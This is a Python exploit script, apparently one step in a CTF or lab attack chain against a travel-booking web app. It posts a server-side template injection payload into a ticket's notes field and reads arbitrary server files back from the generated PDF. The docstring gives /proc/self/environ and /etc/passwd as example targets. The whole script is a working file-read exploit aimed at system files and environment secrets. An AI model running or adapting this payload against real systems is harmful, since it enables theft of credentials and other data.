#!/usr/bin/env python3
"""SSTI file-read via ticket notes. Sink is the PDF, not the HTML page.

    python3 02-ssti-read.py /proc/self/environ
    python3 02-ssti-read.py /etc/passwd
    python3 02-ssti-read.py --printf /proc/self/environ   # %q so NULs survive wrapping
"""
from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from lib import base_url, notes_from_pdf, opener, req, save_jar  # noqa: E402


def find_pnr(o, base: str) -> str:
    _, _, body = req(o, "GET", f"{base}/trips")
    html = body.decode("utf-8", "replace")
    m = re.search(r"/trips/([A-Z0-9]{4,})", html)
    if not m:
        raise SystemExit("no PNR in /trips — run 01-book.py first")
    return m.group(1)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("path")
    ap.add_argument("--pnr")
    ap.add_argument("--printf", action="store_true",
                    help="wrap File() in printf %%q (good for environ)")
    args = ap.parse_args()

    base = base_url()
    o = opener()
    pnr = args.pnr or find_pnr(o, base)
    if args.printf:
        payload = '{{printf "%q" (.File "%s")}}' % args.path
    else:
        payload = '{{.File "%s"}}' % args.path
    print(f"[*] PNR {pnr}  payload {payload}")
    req(o, "POST", f"{base}/tickets/{pnr}/notes", {"notes": payload},
        headers={"HX-Request": "true"})
    save_jar(o)
    st, hdr, pdf = req(o, "GET", f"{base}/tickets/{pnr}/download")
    ctype = hdr.get("Content-Type") or hdr.get("content-type") or ""
    if "pdf" not in ctype.lower():
        raise SystemExit(f"not a PDF ({st} {ctype}): {pdf[:200]!r}")
    text = notes_from_pdf(pdf)
    print(text)


if __name__ == "__main__":
    main()
